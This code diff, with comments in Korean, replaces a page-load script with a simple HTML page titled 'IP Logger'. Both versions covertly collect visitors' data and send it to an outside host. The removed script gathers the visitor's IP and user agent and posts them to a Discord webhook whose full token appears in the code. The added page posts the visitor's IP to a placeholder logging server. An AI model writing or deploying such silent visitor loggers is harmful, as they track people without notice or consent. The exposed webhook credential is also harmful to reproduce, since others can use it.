@@ -1,43 +1,24 @@
-<script>
-    async function sendUserInfo() {
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const userIP = data.ip;
-
-            const userInfo = {
-                ip: userIP,
-                time: new Date().toISOString(),
-                country: '대한민국',
-                asn: 'AS12345',
-                email: 'user@example.com',
-                device: navigator.userAgent,
-                isp: '통신사 예시'
-            };
-
-            const embed = {
-                title: "사이트에 새로운 유저가 들어왔습니다",
-                description: `IP: ${userInfo.ip}\n시간: ${userInfo.time}\n국가: ${userInfo.country}\nASN: ${userInfo.asn}\n이메일: ${userInfo.email}\n기기: ${userInfo.device}\n통신사: ${userInfo.isp}`,
-                color: 7506394
-            };
-
-            console.log('Sending data to Discord:', embed);
-
-            const webhookURL = 'https://discordapp.com/api/webhooks/1287448411985154088/X1Wnq7QgNeXPmTcsiRYr2wHtdlAmoj9dMcdjSW_h346V9v3jP-dq12vzW9uWJ6vJkMbp'; // Add your Discord webhook URL here
-
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ embeds: [embed] })
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+</head>
+<body>
+    <h1>Welcome to the IP Logger</h1>
+    <script>
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                fetch('http://your-server-ip:5000/log_ip', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ ip: data.ip })
+                });
             });
-
-            console.log('Data sent successfully');
-        } catch (error) {
-            console.error('Error sending data:', error);
-        }
-    }
-
-    window.onload = sendUserInfo;
-</script>
+    </script>
+</body>
+</html>
